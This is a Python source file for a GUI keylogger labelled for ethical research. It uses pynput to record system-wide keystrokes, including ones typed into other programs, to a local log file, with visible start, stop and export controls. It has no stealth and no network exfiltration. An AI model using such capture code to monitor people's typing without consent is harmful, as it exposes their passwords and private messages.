import customtkinter as ctk
from pynput import keyboard
import threading
import time
from datetime import datetime

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

log_file = f"keystrokes_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
log_data = []
listening = False

def write_log():
    with open(log_file, "a") as f:
        for key in log_data:
            f.write(key + "\n")
    log_data.clear()

def on_press(key):
    global log_data
    try:
        k = key.char
    except AttributeError:
        k = f"[{key.name}]"
    log_data.append(k)
    if len(log_data) >= 10:
        write_log()
    try:
        log_display.insert("end", k)
    except:
        pass

def start_listener():
    global listening, listener_thread
    if listening:
        return
    listening = True
    log_display.insert("end", "\n[Logging Started]\n")
    listener_thread = threading.Thread(target=run_listener)
    listener_thread.start()

def stop_listener():
    global listening
    if not listening:
        return
    listening = False
    log_display.insert("end", "\n[Logging Stopped]\n")

def run_listener():
    with keyboard.Listener(on_press=on_press) as listener:
        while listening:
            time.sleep(0.1)
        listener.stop()

def export_log():
    write_log()
    log_display.insert("end", "\n[Log Exported]\n")

# GUI
app = ctk.CTk()
app.geometry("700x500")
app.title("🛡️ Keylogger Pro - For Ethical Research Only")

title = ctk.CTkLabel(app, text="🔐 Keylogger Pro", font=("Segoe UI", 20, "bold"))
title.pack(pady=10)

desc = ctk.CTkLabel(app, text="This tool is for ethical research and security awareness only.", text_color="gray")
desc.pack(pady=5)

btn_frame = ctk.CTkFrame(app)
btn_frame.pack(pady=10)

start_btn = ctk.CTkButton(btn_frame, text="Start Logging", command=start_listener, width=150)
start_btn.grid(row=0, column=0, padx=10)

stop_btn = ctk.CTkButton(btn_frame, text="Stop Logging", command=stop_listener, width=150)
stop_btn.grid(row=0, column=1, padx=10)

export_btn = ctk.CTkButton(app, text="Export Logs", command=export_log)
export_btn.pack(pady=5)

log_display = ctk.CTkTextbox(app, width=650, height=300)
log_display.pack(pady=10)
log_display.insert("end", "[Keylogger is idle]\n")

app.mainloop()
